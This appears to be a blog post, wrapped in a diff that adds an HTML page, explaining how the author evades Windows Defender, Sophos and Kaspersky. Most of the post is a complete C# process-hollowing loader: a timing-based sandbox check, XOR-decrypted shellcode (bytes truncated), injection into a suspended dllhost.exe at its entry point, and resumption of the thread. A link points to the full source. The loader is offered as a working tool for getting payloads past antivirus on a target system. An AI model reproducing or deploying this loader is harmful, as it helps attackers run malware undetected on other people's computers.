@@ -1,0 +1,318 @@
+<html><head><style>/* GENERAL */
+body {
+  font-family: "Poppins", sans-serif;
+  background-color: #000;
+  color: #e0e0e0;
+  margin: 0;
+  padding: 0;
+}
+
+/* LAYOUT CONTAINER TO CENTER CONTENT HORIZONTALLY */
+.container {
+  max-width: 900px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+/* TITLES */
+h1, h2, h3, h4, h5, h6 {
+  color: #ffffff;
+  margin-top: 2rem;
+  margin-bottom: 0.5rem;
+}
+
+/* HR FOR SEPARATORS */
+hr {
+  border: none;
+  height: 1px;
+  background-color: #444;
+  margin: 1.5rem auto;
+  width: 80%;
+}
+
+/* PARAGRAPHS */
+p {
+  color: #d0d0d0;
+  line-height: 1.6;
+  margin-bottom: 1rem;
+}
+
+/* LINKS */
+a {
+  color: #1e90ff;
+  text-decoration: none;
+}
+
+a:hover {
+  color: #bbb;
+  text-decoration: underline;
+  text-underline-offset: 0.5rem;
+}
+
+/* CODE BLOCKS */
+code {
+  background-color: #1e1e1e;
+  color: #00e676;
+  padding: 0.2rem 0.4rem;
+  border-radius: 4px;
+  font-family: "Courier New", monospace;
+}
+
+pre {
+  background-color: #1e1e1e;
+  color: #00e676;
+  padding: 1rem;
+  border-radius: 8px;
+  overflow-x: auto;
+  text-align: left;
+  max-width: 100%;
+  margin: 1rem auto;
+}
+
+/* SECTION WRAPPING */
+section {
+  padding-top: 4vh;
+  padding-bottom: 4vh;
+}
+
+.section-container {
+  display: flex;
+  flex-direction: column;
+  align-items: stretch;
+}
+</style></head><body><h1 id="how-i-bypassed-the-big-three-antivirus-solutions">How I Bypassed the &quot;Big Three&quot; Antivirus Solutions</h1>
+<p>Ever been frustrated by getting detected every time you try to execute your code on a target system? Or maybe you&#39;re just curious about how and why you&#39;re getting caught in the first place?</p>
+<p>Well, I&#39;ve got some exciting news to share. I successfully bypassed the latest versions of the three major antivirus solutions: <strong>Windows Defender</strong>, <strong>Sophos</strong>, and <strong>Kaspersky</strong>.</p>
+<h2 id="the-technique-simple-but-effective">The Technique: Simple but Effective</h2>
+<p>My approach was surprisingly straightforward but incredibly effective:</p>
+<ol>
+<li><strong>XOR Encryption</strong> - Bypass static detection</li>
+<li><strong>Process Hollowing</strong> - Stealth execution  </li>
+<li><strong>Memory Management</strong> - RX permissions</li>
+</ol>
+<h2 id="the-key-insight-it-s-not-about-the-technique-it-s-about-the-target">The Key Insight: It&#39;s Not About the Technique, It&#39;s About the Target</h2>
+<p>Here&#39;s the fascinating part - if you try this right now, you might still get detected. But why? Is it the technique itself? Is the XOR encryption not working properly?</p>
+<p><strong>The answer is no.</strong></p>
+<p>The secret lies in making your loader appear legitimate by targeting the right process. Sure, there are obvious choices like <code>svchost.exe</code>, but those are heavily monitored. In fact, when I first tried with <code>svchost.exe</code>, my second-stage payload got detected and killed my session before I could even get a foothold.</p>
+<p>But when I switched to <code>dllhost.exe</code> instead, I achieved success as show below. Here&#39;s why:
+<img src="https://i.gyazo.com/dca0ae05c16d64f461cdfe292d3feefc.png" alt="1"></p>
+<p><strong>dllhost.exe (COM Surrogate) is less scrutinized because it:</strong></p>
+<ul>
+<li><strong>Loads DLLs</strong> (its default job)</li>
+<li><strong>Doesn&#39;t spawn unusual processes</strong></li>
+<li><strong>Communicates over HTTPS</strong> (which can blend into normal traffic)</li>
+</ul>
+<h2 id="the-complete-implementation">The Complete Implementation</h2>
+<p>Now, let&#39;s dive into the actual code that achieved these results. I&#39;ll explain each section line by line:</p>
+<h3 id="step-1-setting-up-the-environment">Step 1: Setting Up the Environment</h3>
+<pre><code class="lang-csharp"><span class="hljs-keyword">using</span> System;
+<span class="hljs-keyword">using</span> System.Diagnostics;
+<span class="hljs-keyword">using</span> System.Runtime.InteropServices;
+<span class="hljs-keyword">using</span> System.Text;
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Hollow</span>
+{
+    <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
+    {
+        <span class="hljs-comment">// Import Windows API for sleep functionality</span>
+        [DllImport(<span class="hljs-string">"kernel32.dll"</span>)]
+        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Sleep</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> dwMilliseconds</span>)</span>;
+</code></pre>
+<p><strong>Explanation:</strong> We start by importing the necessary Windows APIs. The <code>Sleep</code> function will be used for timing-based anti-analysis techniques.</p>
+<h3 id="step-2-defining-windows-structures">Step 2: Defining Windows Structures</h3>
+<pre><code class="lang-csharp">        <span class="hljs-comment">// Structure for process creation information</span>
+        [<span class="hljs-type">StructLayout</span>(<span class="hljs-type">LayoutKind</span>.<span class="hljs-type">Sequential</span>, <span class="hljs-type">CharSet</span> = <span class="hljs-type">CharSet</span>.<span class="hljs-type">Ansi</span>)]
+        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">STARTUPINFO</span>
+        </span>{
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int32</span> cb;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> lpReserved;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> lpDesktop;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> lpTitle;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int32</span> dwX;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int32</span> dwY;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int32</span> dwXSize;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int32</span> dwYSize;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int32</span> dwXCountChars;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int32</span> dwYCountChars;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int32</span> dwFillAttribute;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int32</span> dwFlags;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int16</span> wShowWindow;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">Int16</span> cbReserved2;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> lpReserved2;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> hStdInput;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> hStdOutput;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> hStdError;
+        }
+
+        <span class="hljs-comment">// Structure for process information</span>
+        [<span class="hljs-type">StructLayout</span>(<span class="hljs-type">LayoutKind</span>.<span class="hljs-type">Sequential</span>)]
+        <span class="hljs-keyword">internal</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PROCESS_INFORMATION</span>
+        </span>{
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> hProcess;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> hThread;
+            <span class="hljs-keyword">public</span> int dwProcessId;
+            <span class="hljs-keyword">public</span> int dwThreadId;
+        }
+
+        <span class="hljs-comment">// Structure for process basic information (PEB)</span>
+        [<span class="hljs-type">StructLayout</span>(<span class="hljs-type">LayoutKind</span>.<span class="hljs-type">Sequential</span>)]
+        <span class="hljs-keyword">internal</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PROCESS_BASIC_INFORMATION</span>
+        </span>{
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> <span class="hljs-type">Reserved1</span>;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> <span class="hljs-type">PebAddress</span>;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> <span class="hljs-type">Reserved2</span>;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> <span class="hljs-type">Reserved3</span>;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> <span class="hljs-type">UniquePid</span>;
+            <span class="hljs-keyword">public</span> <span class="hljs-type">IntPtr</span> <span class="hljs-type">MoreReserved</span>;
+        }
+</code></pre>
+<p><strong>Explanation:</strong> These structures are essential for Windows API calls. <code>STARTUPINFO</code> configures how the process starts, <code>PROCESS_INFORMATION</code> holds handles to the created process, and <code>PROCESS_BASIC_INFORMATION</code> contains the PEB (Process Environment Block) address.</p>
+<h3 id="step-3-importing-windows-apis">Step 3: Importing Windows APIs</h3>
+<pre><code class="lang-csharp">        <span class="hljs-comment">// Import CreateProcess for spawning suspended processes</span>
+        [DllImport(<span class="hljs-string">"kernel32.dll"</span>, SetLastError = <span class="hljs-literal">true</span>, CharSet = CharSet.Ansi)]
+        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">CreateProcess</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> lpApplicationName, <span class="hljs-keyword">string</span> lpCommandLine,
+            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, <span class="hljs-keyword">bool</span> bInheritHandles,
+            <span class="hljs-keyword">uint</span> dwCreationFlags, IntPtr lpEnvironment, <span class="hljs-keyword">string</span> lpCurrentDirectory,
+            [In] <span class="hljs-keyword">ref</span> STARTUPINFO lpStartupInfo, <span class="hljs-keyword">out</span> PROCESS_INFORMATION lpProcessInformation</span>)</span>;
+
+        <span class="hljs-comment">// Import ZwQueryInformationProcess for PEB access</span>
+        [DllImport(<span class="hljs-string">"ntdll.dll"</span>, CallingConvention = CallingConvention.StdCall)]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">int</span> <span class="hljs-title">ZwQueryInformationProcess</span>(<span class="hljs-params">IntPtr hProcess,
+            <span class="hljs-keyword">int</span> procInformationClass, <span class="hljs-keyword">ref</span> PROCESS_BASIC_INFORMATION procInformation,
+            <span class="hljs-keyword">uint</span> ProcInfoLen, <span class="hljs-keyword">ref</span> <span class="hljs-keyword">uint</span> retlen</span>)</span>;
+
+        <span class="hljs-comment">// Import memory manipulation functions</span>
+        [DllImport(<span class="hljs-string">"kernel32.dll"</span>, SetLastError = <span class="hljs-literal">true</span>)]
+        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">ReadProcessMemory</span>(<span class="hljs-params">IntPtr hProcess, IntPtr lpBaseAddress,
+            [Out] <span class="hljs-keyword">byte</span>[] lpBuffer, <span class="hljs-keyword">int</span> dwSize, <span class="hljs-keyword">out</span> IntPtr lpNumberOfBytesRead</span>)</span>;
+
+        [DllImport(<span class="hljs-string">"kernel32.dll"</span>)]
+        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">WriteProcessMemory</span>(<span class="hljs-params">IntPtr hProcess, IntPtr lpBaseAddress,
+            <span class="hljs-keyword">byte</span>[] lpBuffer, Int32 nSize, <span class="hljs-keyword">out</span> IntPtr lpNumberOfBytesWritten</span>)</span>;
+
+        <span class="hljs-comment">// Import thread control and memory protection functions</span>
+        [DllImport(<span class="hljs-string">"kernel32.dll"</span>, SetLastError = <span class="hljs-literal">true</span>)]
+        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">uint</span> <span class="hljs-title">ResumeThread</span>(<span class="hljs-params">IntPtr hThread</span>)</span>;
+
+        [DllImport(<span class="hljs-string">"kernel32.dll"</span>, SetLastError = <span class="hljs-literal">true</span>)]
+        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">VirtualProtectEx</span>(<span class="hljs-params">IntPtr hProcess, IntPtr lpAddress,
+            IntPtr dwSize, <span class="hljs-keyword">uint</span> flNewProtect, <span class="hljs-keyword">out</span> <span class="hljs-keyword">uint</span> lpflOldProtect</span>)</span>;
+
+        <span class="hljs-keyword">const</span> <span class="hljs-keyword">uint</span> PAGE_EXECUTE_READ = <span class="hljs-number">0x20</span>;
+</code></pre>
+<p><strong>Explanation:</strong> These are the core Windows APIs we need. <code>CreateProcess</code> creates suspended processes, <code>ZwQueryInformationProcess</code> gets the PEB, <code>ReadProcessMemory</code>/<code>WriteProcessMemory</code> manipulate memory, <code>ResumeThread</code> resumes execution, and <code>VirtualProtectEx</code> changes memory permissions.</p>
+<h3 id="step-4-xor-encryption-function">Step 4: XOR Encryption Function</h3>
+<pre><code class="lang-csharp">        <span class="hljs-comment">// XOR encryption/decryption function</span>
+        <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> XOR(<span class="hljs-built_in">byte</span>[] data, <span class="hljs-built_in">int</span> dataLen, <span class="hljs-built_in">byte</span>[] <span class="hljs-built_in">key</span>, <span class="hljs-built_in">int</span> keyLen)
+        {
+            <span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>;
+            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; dataLen; i++)
+            {
+                data[i] = (<span class="hljs-built_in">byte</span>)(data[i] ^ <span class="hljs-built_in">key</span>[j]);
+                j++;
+                <span class="hljs-keyword">if</span> (j == keyLen)
+                    j = <span class="hljs-number">0</span>;
+            }
+        }
+</code></pre>
+<p><strong>Explanation:</strong> This is our core encryption function. It performs XOR operation between each byte of the data and the key, cycling through the key. XOR is symmetric, so the same function encrypts and decrypts. This bypasses static signature detection.</p>
+<h3 id="step-5-main-execution-logic">Step 5: Main Execution Logic</h3>
+<pre><code class="lang-csharp">        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[] args</span>)
+        </span>{
+            <span class="hljs-comment">// Anti-analysis: Check if execution is being monitored</span>
+            DateTime t1 = DateTime.Now;
+            Sleep(<span class="hljs-number">2000</span>);
+            <span class="hljs-keyword">double</span> t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            <span class="hljs-keyword">if</span> (t2 &lt; <span class="hljs-number">1.5</span>)
+            {
+                <span class="hljs-keyword">return</span>;
+            }
+
+            <span class="hljs-comment">// Define encryption key</span>
+            <span class="hljs-keyword">byte</span>[] key = Encoding.ASCII.GetBytes(<span class="hljs-string">"mysecretkeee"</span>);
+            STARTUPINFO si = <span class="hljs-keyword">new</span> STARTUPINFO();
+            PROCESS_INFORMATION pi = <span class="hljs-keyword">new</span> PROCESS_INFORMATION();
+</code></pre>
+<p><strong>Explanation:</strong> The anti-analysis check detects if the code is running in a sandbox or debugger by measuring execution time. If it&#39;s too fast, it exits. We then initialize our encryption key and process structures.</p>
+<h3 id="step-6-process-hollowing-implementation">Step 6: Process Hollowing Implementation</h3>
+<h4 id="step-1-create-suspended-process">Step 1: Create Suspended Process</h4>
+<pre><code class="lang-csharp">            <span class="hljs-comment">// Step 1: Create Suspended dllhost.exe</span>
+            <span class="hljs-keyword">bool</span> result = CreateProcess(<span class="hljs-literal">null</span>, <span class="hljs-string">"C:\\Windows\\System32\\dllhost.exe"</span>,
+                IntPtr.Zero, IntPtr.Zero, <span class="hljs-literal">false</span>, <span class="hljs-number">0x4</span>, IntPtr.Zero, <span class="hljs-literal">null</span>, <span class="hljs-keyword">ref</span> si, <span class="hljs-keyword">out</span> pi);
+
+            <span class="hljs-keyword">if</span> (!result)
+            {
+                Console.WriteLine(<span class="hljs-string">"Failed to create process."</span>);
+                <span class="hljs-keyword">return</span>;
+            }
+</code></pre>
+<p><strong>Explanation:</strong> We create <code>dllhost.exe</code> in suspended state (flag 0x4). This process is perfect because it&#39;s legitimate, loads DLLs by default, and is less monitored than <code>svchost.exe</code>.</p>
+<h4 id="step-2-get-process-environment-block-peb-">Step 2: Get Process Environment Block (PEB)</h4>
+<pre><code class="lang-csharp">            <span class="hljs-comment">// Step 2: Get PEB using ZwQueryInformationProcess</span>
+            <span class="hljs-type">PROCESS_BASIC_INFORMATION</span> bi = <span class="hljs-function"><span class="hljs-keyword">new</span> <span class="hljs-title">PROCESS_BASIC_INFORMATION</span>();
+            <span class="hljs-title">uint</span> <span class="hljs-title">tmp</span> = 0;
+            <span class="hljs-title">ZwQueryInformationProcess</span>(pi.hProcess, <span class="hljs-number">0</span>, ref bi, (uint)(<span class="hljs-type">IntPtr</span>.<span class="hljs-type">Size</span> * <span class="hljs-number">6</span>), <span class="hljs-title">ref</span> <span class="hljs-title">tmp</span>);
+            <span class="hljs-title">IntPtr</span> <span class="hljs-title">ptrToImageBase</span> = (<span class="hljs-type">IntPtr</span>)((<span class="hljs-type">Int64</span>)<span class="hljs-title">bi</span>.<span class="hljs-title">PebAddress</span> + 0<span class="hljs-title">x10</span>);</span>
+</code></pre>
+<p><strong>Explanation:</strong> We query the process to get the PEB address, then calculate the pointer to the image base (PEB + 0x10 offset). This gives us access to the process&#39;s memory layout.</p>
+<h4 id="step-3-read-process-memory">Step 3: Read Process Memory</h4>
+<pre><code class="lang-csharp">            // Step <span class="hljs-number">3</span>: Read Image <span class="hljs-keyword">Base </span><span class="hljs-keyword">Address
+</span>            <span class="hljs-keyword">byte[] </span><span class="hljs-keyword">addrBuf </span>= new <span class="hljs-keyword">byte[IntPtr.Size];
+</span>            IntPtr nRead = IntPtr.Zero<span class="hljs-comment">;</span>
+            ReadProcessMemory(pi.hProcess, ptrToImageBase, <span class="hljs-keyword">addrBuf, </span><span class="hljs-keyword">addrBuf.Length, </span>out nRead)<span class="hljs-comment">;</span>
+            IntPtr dllhostBase = (IntPtr)(<span class="hljs-keyword">BitConverter.ToInt64(addrBuf, </span><span class="hljs-number">0</span>))<span class="hljs-comment">;</span>
+
+            // Step <span class="hljs-number">4</span>: Read PE Header
+            <span class="hljs-keyword">byte[] </span><span class="hljs-meta">data</span> = new <span class="hljs-keyword">byte[0x200];
+</span>            ReadProcessMemory(pi.hProcess, dllhostBase, <span class="hljs-meta">data</span>, <span class="hljs-meta">data</span>.Length, out nRead)<span class="hljs-comment">;</span>
+</code></pre>
+<p><strong>Explanation:</strong> We read the actual base address of the process and then read the PE header (first 0x200 bytes) to parse the executable structure.</p>
+<h4 id="step-4-parse-entry-point">Step 4: Parse Entry Point</h4>
+<pre><code class="lang-csharp">            <span class="hljs-comment">// Step 5: Parse EntryPoint</span>
+            <span class="hljs-keyword">uint</span> e_lfanew_offset = BitConverter.ToUInt32(data, <span class="hljs-number">0x3C</span>);
+            <span class="hljs-keyword">uint</span> opthdr = e_lfanew_offset + <span class="hljs-number">0x28</span>;
+            <span class="hljs-keyword">uint</span> entrypoint_rva = BitConverter.ToUInt32(data, (<span class="hljs-keyword">int</span>)opthdr);
+            IntPtr addressOfEntryPoint = (IntPtr)((UInt64)dllhostBase + entrypoint_rva);
+</code></pre>
+<p><strong>Explanation:</strong> We parse the PE header to find the entry point. The offset 0x3C contains the PE header offset, 0x28 bytes into that is the entry point RVA, which we add to the base address.</p>
+<h3 id="step-7-shellcode-injection-and-execution">Step 7: Shellcode Injection and Execution</h3>
+<h4 id="step-5-decrypt-and-inject-shellcode">Step 5: Decrypt and Inject Shellcode</h4>
+<pre><code class="lang-csharp">            <span class="hljs-comment">// Step 6: Write encrypted shellcode at EntryPoint</span>
+            byte[] buf = new byte[<span class="hljs-number">812</span>] {
+                <span class="hljs-number">0x91</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x74</span>,
+                <span class="hljs-comment">// ... (encrypted shellcode bytes)</span>
+            };
+
+            <span class="hljs-comment">// Step 6: Decrypt shellcode</span>
+            XOR(buf, buf.Length, <span class="hljs-type">key</span>, <span class="hljs-type">key</span>.Length);
+
+            <span class="hljs-comment">// Step 7: Write shellcode to entry point</span>
+            WriteProcessMemory(pi.hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+</code></pre>
+<p><strong>Explanation:</strong> We have our encrypted shellcode (812 bytes), decrypt it using our XOR function, then write it to the entry point of the suspended process, effectively replacing the original code.</p>
+<h4 id="step-6-set-memory-permissions-and-resume">Step 6: Set Memory Permissions and Resume</h4>
+<pre><code class="lang-csharp">            <span class="hljs-comment">// Step 8: Change memory protection to RX</span>
+            <span class="hljs-selector-tag">uint</span> <span class="hljs-selector-tag">oldProtect</span>;
+            <span class="hljs-selector-tag">VirtualProtectEx</span>(pi.hProcess, addressOfEntryPoint, (IntPtr)buf.Length, PAGE_EXECUTE_READ, out oldProtect);
+
+            <span class="hljs-comment">// Step 9: Resume Thread</span>
+            <span class="hljs-selector-tag">ResumeThread</span>(pi.hThread);
+
+            <span class="hljs-selector-tag">Console</span><span class="hljs-selector-class">.WriteLine</span>(<span class="hljs-string">"Process hollowing completed."</span>);
+        }
+    }
+}
+</code></pre>
+<p><strong>Explanation:</strong> We change the memory permissions to RX (Read/Execute) to allow execution, then resume the thread. The process now executes our shellcode instead of the original dllhost.exe code.</p>
+<h2 id="why-this-works">Why This Works</h2>
+<p>The success of this technique lies in several key factors:</p>
+<ul>
+<li><strong>Process Selection:</strong> dllhost.exe is a legitimate Windows process that loads DLLs by default</li>
+<li><strong>Memory Permissions:</strong> RX permissions make the execution look legitimate</li>
+<li><strong>XOR Encryption:</strong> Bypasses static signature detection</li>
+<li><strong>Process Hollowing:</strong> Completely replaces the process content</li>
+<li><strong>Anti-Analysis:</strong> Timing checks prevent sandbox detection</li>
+</ul>
+<h2 id="full-code">Full code</h2>
+<p>You can find the full code on my <a href="https://github.com/amroes/byebyeAV">github</a>, if u liked it and liked this blog make sure you give it a star. Thanks for your read</p>
+</body></html>
